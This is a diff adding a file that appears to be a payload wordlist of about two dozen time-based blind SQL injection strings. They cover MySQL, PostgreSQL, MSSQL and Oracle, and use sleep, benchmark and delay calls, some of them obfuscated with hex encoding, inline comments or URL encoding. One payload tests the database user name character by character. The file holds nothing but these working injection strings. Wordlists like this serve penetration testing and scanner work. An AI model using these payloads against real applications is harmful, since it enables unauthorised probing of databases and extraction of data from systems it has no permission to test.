@@ -1,0 +1,25 @@
+SLEEP(1)
+' or 1=1 and sleep(1) --
+' or 1=1 and sleep(1) #
+BENCHMARK(1000000,MD5('A'))
+; SELECT SLEEP(1)
+AND (SELECT * FROM (SELECT(SLEEP(1)))MySubQuery)
+'; WAITFOR DELAY '00:00:01'--
+'; SELECT pg_sleep(1)--
+' OR SLEEP(1)--
+' OR BENCHMARK(1000000,MD5('A'))--
+AND (SELECT * FROM (SELECT(SLEEP(1)))MySubQuery)
+' OR (SELECT 0x57414954464F522044454C4159202730303A30303A303127)--
+' OR IF(1=1, SLEEP(1), NULL)--
+' OR (SELECT * FROM INFORMATION_SCHEMA.PLUGINS) HAVING SUM(SLEEP(1)) > 0 --
+SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE pg_sleep(0) END--
+'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
+1'=sleep(1)='1
+'%2b(select*from(select(sleep(1)))a)%2b'
+WAITFOR DELAY '0:0:1';--
+WAITFOR DELAY '0:0:1' and 'a'='a;--
+IF 1=1 THEN dbms_lock.sleep(1);
+and if(substring(user(),1,1)>=chr(97),SLEEP(1),1)--
+1,'0');waitfor delay '0:0:1;--
+/**/xor/**/sleep(1)
+or (sleep(1)+1) limit 1 --
